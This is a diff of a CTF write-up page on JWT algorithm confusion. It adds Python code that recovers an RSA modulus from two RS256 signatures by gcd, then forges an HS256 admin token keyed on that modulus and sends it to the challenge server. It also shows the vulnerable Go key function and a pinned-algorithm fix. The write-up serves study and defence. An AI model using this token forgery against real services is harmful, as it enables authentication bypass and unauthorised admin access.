@@ -1,4 +1,4 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Confusion — RS256→HS256 key confusion — YDS CTF — writeups</title><style>
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Confusion — recover the RSA modulus, then sign HS256 with it — YDS CTF — writeups</title><style>
 :root{
   --bg:#0b0e13; --bg2:#0f131a; --panel:#141a23; --panel2:#1a2230; --line:#232c3a;
   --fg:#e6edf3; --fg2:#c3cdd8; --dim:#8b949e; --faint:#6e7681;
@@ -248,28 +248,106 @@ span.linenos.special { color: #e6edf3; background-color: #6e7681; padding-left: 
 .codehilite .vm { color: #79C0FF } /* Name.Variable.Magic */
 .codehilite .il { color: #A5D6FF } /* Literal.Number.Integer.Long */
 pre .codehilite, .codehilite pre{background:transparent;border:0;padding:0;margin:0}
-</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web">Web</a><a href="../index.html#crypto" class="on">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#crypto">Crypto</a></div><h1>Confusion — RS256→HS256 key confusion</h1><p class="tags"><span class="tag">jwt</span><span class="tag">algorithm-confusion</span><span class="tag">public-key-as-hmac-secret</span></p><div class="artmeta"><span>confusion.is-course.ru</span><span>1 min read</span><span>113 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#tldr">TL;DR</a></li>
-<li><a href="#exploit">Exploit</a></li>
-<li><a href="#root-cause">Root cause</a></li>
+</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web">Web</a><a href="../index.html#crypto" class="on">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#crypto">Crypto</a></div><h1>Confusion — recover the RSA modulus, then sign HS256 with it</h1><p class="tags"><span class="tag">jwt</span><span class="tag">hs256</span><span class="tag">rsa</span><span class="tag">modulus-recovery</span><span class="tag">gcd</span><span class="tag">source-audit</span></p><div class="artmeta"><span>confusion.is-course.ru</span><span>2 min read</span><span>367 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#tldr">TL;DR</a></li>
+<li><a href="#the-application">The application</a></li>
+<li><a href="#step-1-recover-the-modulus-from-two-signatures">Step 1 — recover the modulus from two signatures</a></li>
+<li><a href="#step-2-forge-the-admin-token">Step 2 — forge the admin token</a></li>
+<li><a href="#why-it-works">Why it works</a></li>
 <li><a href="#fix">Fix</a></li></ol></nav><h1 id="confusion">Confusion</h1>
 <h2 id="tldr" id="tldr">TL;DR</h2>
-<p>The service verifies RS256 tokens but the library also accepts HS256. Signing an HS256 token with the
-<strong>public key</strong> (which the app happily serves) makes the server validate the HMAC using that public key
-as the shared secret — full forgery.</p>
-<h2 id="exploit" id="exploit">Exploit</h2>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
-<span class="n">pub</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://confusion.is-course.ru/public.pem"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>   <span class="c1"># or from the page</span>
-<span class="n">tok</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s2">"user"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">},</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">"HS256"</span><span class="p">)</span>
+<p>The service signs JWTs with <strong>either</strong> RS256 <strong>or</strong> HS256, and lets the client choose the algorithm at
+signup (<code>algo=rsa256|hs256</code>). The HMAC key for HS256 is not a random secret — the source ships with the
+challenge, and it is one line:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">hsKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="nx">k</span><span class="p">.</span><span class="nx">N</span><span class="p">.</span><span class="nx">Text</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span><span class="w">          </span><span class="c1">// the RSA modulus, as a hex *string*</span>
 </code></pre></div>
 
-<p>Present it to the protected endpoint with <code>role/user=admin</code> → flag
-<code>Kryprographie_ist_kein_Ponyhof</code>.</p>
-<h2 id="root-cause" id="root-cause">Root cause</h2>
-<p>Algorithm confusion happens when the verifier selects the algorithm from the token header and then
-picks the key accordingly. Public keys are public, so any HS256 token "signed" with them is valid.</p>
+<p>So if we can learn <code>N</code>, we can mint an HS256 token with <code>admin: true</code>. The public key is not published,
+but two RS256 signatures are enough to recover <code>N</code> — which is exactly what this challenge is about.</p>
+<h2 id="the-application" id="the-application">The application</h2>
+<div class="codehilite"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nx">getClaims</span><span class="p">(</span><span class="nx">value</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">MapClaims</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">kf</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="o">*</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">Token</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kd">interface</span><span class="p">{},</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">Method</span><span class="p">.(</span><span class="kd">type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="o">*</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodRSA</span><span class="p">:</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="nx">rsaPublicKey</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="o">*</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHMAC</span><span class="p">:</span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">hsKey</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="w">          </span><span class="c1">// &lt;- the confusion</span>
+<span class="w">        </span><span class="k">default</span><span class="p">:</span><span class="w">                      </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"invalid algorithm: %s"</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">Alg</span><span class="p">())</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">kf</span><span class="p">)</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>The key function dispatches on the <em>attacker-supplied</em> <code>alg</code> header, which is the textbook
+algorithm-confusion shape. What makes it interesting is where the HMAC key comes from: <code>k.N.Text(16)</code>
+is the modulus in lowercase hex, used as ASCII bytes — 512 characters for a 2048-bit key. It is not the
+PEM blob, so the usual "sign HS256 with <code>public.pem</code>" recipe does <strong>not</strong> work here.</p>
+<h2 id="step-1-recover-the-modulus-from-two-signatures" id="step-1-recover-the-modulus-from-two-signatures">Step 1 — recover the modulus from two signatures</h2>
+<p>For a PKCS#1 v1.5 RS256 signature <code>s</code> on message <code>m</code>:</p>
+<div class="codehilite"><pre><span></span><code>s^e ≡ EM(m)  (mod N),      EM = 0x00 || 0x01 || 0xFF…  || 0x00 || DigestInfo(SHA-256(m))
+</code></pre></div>
+
+<p>so <code>s^e − EM(m)</code> is an exact multiple of <code>N</code>. Two signatures from the same key give two multiples, and
+their <strong>gcd</strong> is <code>N</code> times a small cofactor:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">gmpy2</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
+
+<span class="n">DI</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">"3031300d060960864801650304020105000420"</span><span class="p">)</span>   <span class="c1"># DigestInfo || SHA-256</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">em_and_sig</span><span class="p">(</span><span class="n">tok</span><span class="p">):</span>
+    <span class="n">h</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="n">tok</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span>
+    <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">h</span> <span class="o">+</span> <span class="s2">"."</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+    <span class="n">T</span>   <span class="o">=</span> <span class="n">DI</span> <span class="o">+</span> <span class="n">digest</span>
+    <span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s2">"="</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">k</span>   <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sig</span><span class="p">)</span>                                     <span class="c1"># = modulus length</span>
+    <span class="n">EM</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00\x01</span><span class="s2">"</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">k</span> <span class="o">-</span> <span class="mi">3</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">T</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">+</span> <span class="n">T</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">EM</span><span class="p">,</span> <span class="s2">"big"</span><span class="p">),</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="s2">"big"</span><span class="p">)</span>
+
+<span class="n">m1</span><span class="p">,</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">em_and_sig</span><span class="p">(</span><span class="n">tok1</span><span class="p">)</span>     <span class="c1"># two signups, algo=rsa256</span>
+<span class="n">m2</span><span class="p">,</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">em_and_sig</span><span class="p">(</span><span class="n">tok2</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">g</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">mpz</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span><span class="o">**</span><span class="n">e</span> <span class="o">-</span> <span class="n">m1</span><span class="p">,</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">mpz</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span><span class="o">**</span><span class="n">e</span> <span class="o">-</span> <span class="n">m2</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">):</span>                          <span class="c1"># strip the cofactor</span>
+    <span class="k">while</span> <span class="n">g</span> <span class="o">%</span> <span class="n">p</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="n">g</span> <span class="o">//=</span> <span class="n">p</span>
+<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">g</span><span class="p">)</span>
+<span class="k">assert</span> <span class="nb">pow</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span> <span class="o">==</span> <span class="n">m1</span> <span class="ow">and</span> <span class="nb">pow</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span> <span class="o">==</span> <span class="n">m2</span>      <span class="c1"># 2048-bit, verified</span>
+</code></pre></div>
+
+<p>Two signatures are enough; a single one would need to know <code>N</code> already. (Our first attempt failed
+because we grabbed the <em>session</em> cookie of a default signup instead of a token whose header said
+<code>RS256</code> — always re-derive <code>EM</code> from the token you actually hold.)</p>
+<h2 id="step-2-forge-the-admin-token" id="step-2-forge-the-admin-token">Step 2 — forge the admin token</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">key</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="s2">"x"</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>                            <span class="c1"># exactly `k.N.Text(16)`</span>
+<span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"alg"</span><span class="p">:</span> <span class="s2">"HS256"</span><span class="p">,</span> <span class="s2">"typ"</span><span class="p">:</span> <span class="s2">"JWT"</span><span class="p">}</span>
+<span class="n">pl</span>  <span class="o">=</span> <span class="p">{</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"admin"</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
+<span class="n">h</span>   <span class="o">=</span> <span class="n">b64e</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span>   <span class="o">=</span> <span class="n">b64e</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">pl</span><span class="p">,</span>  <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">sig</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="s2">"."</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">"/restricted"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">"session"</span><span class="p">:</span> <span class="n">h</span> <span class="o">+</span> <span class="s2">"."</span> <span class="o">+</span> <span class="n">p</span> <span class="o">+</span> <span class="s2">"."</span> <span class="o">+</span> <span class="n">b64e</span><span class="p">(</span><span class="n">sig</span><span class="p">)})</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>HTTP/1.1 200 OK
+YDS{…redacted…}
+</code></pre></div>
+
+<h2 id="why-it-works" id="why-it-works">Why it works</h2>
+<ul>
+<li><strong>Algorithm selection is attacker-controlled.</strong> <code>jwt.Parse</code> with a key function that branches on
+  <code>t.Method</code> trusts the header to decide <em>which kind of key</em> is used.</li>
+<li><strong>The HMAC key is derived from public-key material.</strong> A modulus is not a secret; anyone who can
+  recover or guess it (here, from signatures) can compute the HMAC.</li>
+<li><strong>The <code>admin</code> claim is the authorisation check.</strong> No server-side session, so a self-issued claim is
+  the whole gate.</li>
+</ul>
 <h2 id="fix" id="fix">Fix</h2>
-<p>Pin the algorithm server-side (<code>jwt.WithValidMethods([]string{"RS256"})</code>), and never let a PEM blob
-double as an HMAC secret.</p><nav class="pager"><a href="aes-ecb.html"><div class="lbl">&larr; previous</div><div class="ttl">AES ECB — byte-at-a-time</div></a><a class="next" href="extender.html"><div class="lbl">next &rarr;</div><div class="ttl">Hash extender — SHA-256 length extension</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
+<div class="codehilite"><pre><span></span><code><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">ParseWithClaims</span><span class="p">(</span><span class="nx">raw</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">Claims</span><span class="p">{},</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="o">*</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">Token</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">any</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">Alg</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">"RS256"</span><span class="w"> </span><span class="p">{</span><span class="w">                 </span><span class="c1">// pin one algorithm</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">"unexpected signing method"</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">rsaPublicKey</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+<span class="p">})</span>
+</code></pre></div>
+
+<p>and never derive an HMAC key from a value that is, or can be, public — use a random 32-byte secret
+from a secret manager, separate from the signing key.</p><nav class="pager"><a href="aes-ecb.html"><div class="lbl">&larr; previous</div><div class="ttl">AES ECB — byte-at-a-time</div></a><a class="next" href="extender.html"><div class="lbl">next &rarr;</div><div class="ttl">Hash extender — SHA-256 length extension</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
 <script>
 document.querySelectorAll('pre').forEach(function(pre){
   var b=document.createElement('button');
